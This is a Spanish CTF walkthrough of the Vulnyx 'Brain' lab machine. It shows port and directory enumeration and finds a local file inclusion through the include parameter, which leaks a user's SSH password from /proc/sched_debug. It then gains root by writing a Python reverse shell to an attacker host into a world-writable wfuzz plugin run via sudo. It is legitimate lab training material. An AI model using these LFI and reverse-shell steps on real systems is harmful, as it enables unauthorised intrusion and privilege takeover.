---
icon: flag
---

# Brain Vulnyx (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-09 05:19 EDT
Nmap scan report for 192.168.5.96
Host is up (0.00058s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 32:95:f9:20:44:d7:a1:d1:80:a8:d6:95:91:d5:1e:da (RSA)
|   256 07:e7:24:38:1d:64:f6:88:9a:71:23:79:b8:d8:e6:57 (ECDSA)
|_  256 58:a6:da:1e:0f:89:42:2b:ba:de:00:fc:71:78:3d:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 08:00:27:05:BA:6C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.24 seconds
```

Veremos puertos interesantes, pero entre ellos, el puerto `80` que suele alojar una pagina web, si entramos dentro veremos lo siguiente:

```
runnable tasks:
 S           task   PID         tree-key  switches  prio     wait-time             sum-exec        sum-sleep
-----------------------------------------------------------------------------------------------------------
 S        systemd     1      2927.102286      1731   120         0.000000       509.025216         0.000000 0 0 /
```

La línea `runnable tasks:` y columnas como `task`, `PID`, `prio`, `wait-time`, `sum-exec`, `sum-sleep` son típicas de **`/proc/sched_debug`**, por lo que puede ser interesante saber esto, ya que parece que la web nos quiere dar una pista, pero no veremos nada mas.

Vamos a realizar un poco de `fuzzing`.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.96/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 361]
Progress: 63222 / 882244 (7.17%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 64694 / 882244 (7.33%)
===============================================================
Finished
===============================================================
```

No veremos nada interesante, pero si veremos un `index.php` que es en el que estamos, como no podemos hacer nada mas, vamos a probar a realizar un `fuzzing` con parametro de `PHP` a ver si alguno fuera vulnerable a un `LFI`.

## FFUF

```shell
ffuf -u 'http://<IP>/index.php?FUZZ=/etc/passwd' -w <WORDLIST> -fs 361
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.5.96/index.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 361
________________________________________________

include                 [Status: 200, Size: 1750, Words: 125, Lines: 34, Duration: 24ms]
:: Progress: [20469/20469] :: Job [1/1] :: 1342 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
```

Veremos que ha funcionado, encontramos el parametro `include` como parametro vulnerable en el cual podemos leer archivos del sistema (`LFI`) local, por lo que vamos a realizar lo siguiente para probarlo.

## Escalate user ben

```
URL = http://<IP>/index.php?include=/etc/passwd
```

Info:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ben:x:1000:1000:ben,,,:/home/ben:/bin/bash
```

Veremos que esta funcionando y ya identificamos `1` usuario llamado `ben`, pero si recordamos antes en la pagina estaba cargando un archivo llamado `/proc/sched_debug`, vamos a probar a intentar leerlo a ver si nos revela informacion importante o no.

```
URL = http://<IP>/index.php?include=/proc/sched_debug
```

Info:

```
...........................<RESTO DE INFO>.........................................
S    ben:B3nP4zz   393      1585.480237        59   120         0.000000         4.695817         0.000000 0 0 /
...........................<RESTO DE INFO>.........................................
```

De toda la info que nos suelta vemos interesante esta linea de aqui, por lo que vemos puede ser una posible contraseña del usuario `ben` por `SSH`.

### SSH

```shell
ssh ben@<IP>
```

Metemos como contraseña `B3nP4zz`...

```
Linux brain 4.19.0-23-amd64 #1 SMP Debian 4.19.269-1 (2022-12-20) x86_64
ben@brain:~$ whoami
ben
```

Veremos que estaremos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
4be68799a5cef6a6e2b36379e8ae2759
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for ben on Brain:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ben may run the following commands on Brain:
    (root) NOPASSWD: /usr/bin/wfuzz
```

Veremos que podemos ejecutar el binario `wfuzz` como el usuario `root`, vamos a ver el `help` de dicha herramienta a ver que podemos ver.

Si listamos los permisos de los `.py` que utiliza la herramienta `wfuzz`, ya que dicha herramienta cada parametro que tiene, lo tiene asociado con un sccript en `python`, veremos lo siguiente:

```shell
find /usr/lib/python3/dist-packages/wfuzz /usr/share/wfuzz -type f -name "*.py" -exec ls -l {} \;
```

Info:

```
-rw-r--r-- 1 root root 32 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/__main__.py
-rw-r--r-- 1 root root 1729 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/mixins.py
-rw-r--r-- 1 root root 10509 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/options.py
-rw-r--r-- 1 root root 822 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/exception.py
-rw-r--r-- 1 root root 10349 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/core.py
-rw-r--r-- 1 root root 722 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/api.py
-rw-r--r-- 1 root root 2754 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/facade.py
-rw-r--r-- 1 root root 1739 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/scripts/listing.py
-rw-r--r-- 1 root root 1148 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/scripts/grep.py
-rw-r--r-- 1 root root 2179 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/scripts/svn_extractor.py
-rw-r--r-- 1 root root 1513 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/scripts/robots.py
-rw-r--r-- 1 root root 4129 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/scripts/errors.py
-rw-r--r-- 1 root root 1156 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/scripts/sitemap.py
-rw-r--r-- 1 root root 1580 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/scripts/cvs_extractor.py
-rw-r--r-- 1 root root 1133 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/scripts/screenshot.py
-rw-r--r-- 1 root root 2234 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/scripts/links.py
-rw-r--r-- 1 root root 837 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/scripts/title.py
-rw-r--r-- 1 root root 1624 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/scripts/headers.py
-rw-r--r-- 1 root root 2446 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/scripts/wcdb.py
-rw-r--r-- 1 root root 0 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/scripts/__init__.py
-rw-r--r-- 1 root root 931 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/scripts/cookies.py
-rw-r--r-- 1 root root 1906 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/scripts/backups.py
-rw-r--r-- 1 root root 0 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/printers/__init__.py
-rw-r--r-- 1 root root 11634 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/printers/printers.py
-rw-r--r-- 1 root root 1873 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/iterators/iterations.py
-rw-r--r-- 1 root root 0 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/iterators/__init__.py
-rw-r--r-- 1 root root 1447 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/hexrand.py
-rw-r--r-- 1 root root 3234 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/names.py
-rw-r--r-- 1 root root 1556 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/list.py
-rw-r--r-- 1 root root 1438 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/dirwalk.py
-rw-r--r-- 1 root root 1549 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/iprange.py
-rw-r--r-- 1 root root 1199 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/guitab.py
-rw-r--r-- 1 root root 1594 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/ipnet.py
-rw-r--r-- 1 root root 1232 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/bing.py
-rwxrwxrwx 1 root root 1519 abr 19  2023 /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/range.py
-rw-r--r-- 1 root root 699 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/stdin.py
-rw-r--r-- 1 root root 1669 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/permutation.py
-rw-r--r-- 1 root root 1370 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/file.py
-rw-r--r-- 1 root root 2064 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/wfuzzp.py
-rw-r--r-- 1 root root 1546 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/hexrange.py
-rw-r--r-- 1 root root 962 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/buffer_overflow.py
-rw-r--r-- 1 root root 0 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/__init__.py
-rw-r--r-- 1 root root 2053 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/autorize.py
-rw-r--r-- 1 root root 7807 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/burpstate.py
-rw-r--r-- 1 root root 3581 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/burplog.py
-rw-r--r-- 1 root root 0 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/__init__.py
-rw-r--r-- 1 root root 13333 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/encoders/encoders.py
-rw-r--r-- 1 root root 0 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugins/encoders/__init__.py
-rw-r--r-- 1 root root 4530 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/utils.py
-rw-r--r-- 1 root root 9977 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/myqueues.py
-rw-r--r-- 1 root root 5201 ene 25  2019 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py
-rw-r--r-- 1 root root 338 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugin_api/mixins.py
-rw-r--r-- 1 root root 4142 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugin_api/payloadtools.py
-rw-r--r-- 1 root root 4677 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugin_api/base.py
-rw-r--r-- 1 root root 1813 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugin_api/urlutils.py
-rw-r--r-- 1 root root 0 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/plugin_api/__init__.py
-rw-r--r-- 1 root root 7932 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/myhttp.py
-rw-r--r-- 1 root root 2232 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/ui/gui/controller.py
-rw-r--r-- 1 root root 10451 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/ui/gui/guicontrols.py
-rw-r--r-- 1 root root 2988 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/ui/gui/model.py
-rw-r--r-- 1 root root 0 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/ui/gui/__init__.py
-rw-r--r-- 1 root root 5660 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/ui/console/output.py
-rw-r--r-- 1 root root 8699 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/ui/console/mvc.py
-rw-r--r-- 1 root root 15591 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/ui/console/clparser.py
-rw-r--r-- 1 root root 10842 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/ui/console/common.py
-rw-r--r-- 1 root root 2629 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/ui/console/getch.py
-rw-r--r-- 1 root root 0 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/ui/console/__init__.py
-rw-r--r-- 1 root root 0 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/ui/__init__.py
-rw-r--r-- 1 root root 10139 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/fuzzqueues.py
-rw-r--r-- 1 root root 5366 ene 25  2019 /usr/lib/python3/dist-packages/wfuzz/externals/reqresp/TextParser.py
-rw-r--r-- 1 root root 8353 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/externals/reqresp/Response.py
-rw-r--r-- 1 root root 713 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/externals/reqresp/cache.py
-rw-r--r-- 1 root root 245 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/externals/reqresp/exceptions.py
-rw-r--r-- 1 root root 4174 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/externals/reqresp/Variables.py
-rw-r--r-- 1 root root 60 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/externals/reqresp/__init__.py
-rw-r--r-- 1 root root 17387 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/externals/reqresp/Request.py
-rw-r--r-- 1 root root 2657 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/externals/settings/settings.py
-rw-r--r-- 1 root root 0 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/externals/settings/__init__.py
-rw-r--r-- 1 root root 0 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/externals/__init__.py
-rw-r--r-- 1 root root 4524 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/externals/moduleman/modulefilter.py
-rw-r--r-- 1 root root 5016 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/externals/moduleman/loader.py
-rw-r--r-- 1 root root 0 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/externals/moduleman/__init__.py
-rw-r--r-- 1 root root 4293 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/externals/moduleman/registrant.py
-rw-r--r-- 1 root root 482 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/externals/moduleman/plugin.py
-rw-r--r-- 1 root root 1232 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/__init__.py
-rw-r--r-- 1 root root 12958 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/filter.py
-rw-r--r-- 1 root root 29849 ene 12  2019 /usr/lib/python3/dist-packages/wfuzz/fuzzobjects.py
```

Veremos interesante una linea en concreto, en la cual tendremos todos los permisos para modificar lo que queramos en el script de `python` de un parametro de la herramienta.

```
-rwxrwxrwx 1 root root 1519 abr 19  2023 /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/range.py
```

Si investigamos a que parametro pertenece dicho script veremos que es al parametro `-z range,<RANGOMINIMO>-<RANGOMAXIMO>` por lo que vamos a modificar dicho script para meter lo siguiente:

Antes para borrarlo todo haremos esto:

```shell
echo '' > /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/range.py
```

> range.py

```python
#!/usr/bin/env python3
import socket,subprocess,os,pty

# Cambia estos valores por los de tu máquina atacante
RHOST = "<IP>"          # IP del atacante
RPORT = <PORT>          # Puerto donde escucharás con netcat

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))
    os.dup2(s.fileno(),0)   # STDIN
    os.dup2(s.fileno(),1)   # STDOUT
    os.dup2(s.fileno(),2)   # STDERR
    pty.spawn("/bin/bash")
except Exception as e:
    pass
```

Ahora si lo guardamos y ejecutamos la herramienta de esta forma invocando el parametro para que se ejecute el script de `python`...

```shell
sudo wfuzz -z range,1-10 http://localhost/FUZZ
```

Antes de ejecutarlo nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si lo ejecutamos lo anterior y volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.50] from (UNKNOWN) [192.168.5.96] 55380
root@brain:/home/ben# whoami
whoami
root
```

Veremos que ha funcionado, por lo que sanitizaremos la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Ahora que somos `root`, vamos a leer la `flag` de `root`.

> root.txt

```
08c391c2d775390f54ee859d7395ac68
```
